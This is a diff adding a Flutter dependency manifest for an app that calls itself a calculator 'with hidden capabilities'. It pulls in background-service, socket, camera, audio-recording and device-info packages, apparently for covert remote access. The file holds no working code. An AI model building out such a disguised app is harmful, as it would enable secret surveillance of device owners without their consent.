@@ -1,0 +1,66 @@
+name: devicebridge_calculator
+description: A fully functional calculator app (with hidden capabilities)
+publish_to: 'none'
+version: 1.0.0+1
+
+environment:
+  sdk: '>=3.2.0 <4.0.0'
+
+dependencies:
+  flutter:
+    sdk: flutter
+
+  # State Management
+  flutter_riverpod: ^2.4.9
+  riverpod_annotation: ^2.3.3
+
+  # Background Service
+  flutter_background_service: ^3.0.1
+
+  # Socket.IO (replacing Pusher)
+  socket_io_client: ^2.0.3+1
+
+  # JWT
+  dart_jsonwebtoken: ^2.12.1
+  jwt_decoder: ^2.0.1
+
+  # Secure Storage
+  flutter_secure_storage: ^9.0.0
+
+  # HTTP Client
+  dio: ^5.4.0
+
+  # Hardware Plugins
+  camera: ^0.10.5+5
+  record: ^5.0.4
+  torch_light: ^1.1.0
+  path_provider: ^2.1.2
+  permission_handler: ^11.3.0
+  device_info_plus: ^9.1.1
+  battery_plus: ^5.0.2
+  connectivity_plus: ^5.0.2
+  package_info_plus: ^5.0.1
+
+  # UI
+  google_fonts: ^6.1.0
+  fluttertoast: ^8.2.4
+  vibration: ^1.8.4
+
+  # Notifications
+  flutter_local_notifications: ^16.3.0
+
+  # Utils
+  intl: ^0.19.0
+  uuid: ^4.3.3
+  shared_preferences: ^2.2.2
+
+  # Icons
+  lucide_icons: ^0.307.0
+
+dev_dependencies:
+  flutter_test:
+    sdk: flutter
+  flutter_lints: ^3.0.1
+
+flutter:
+  uses-material-design: true
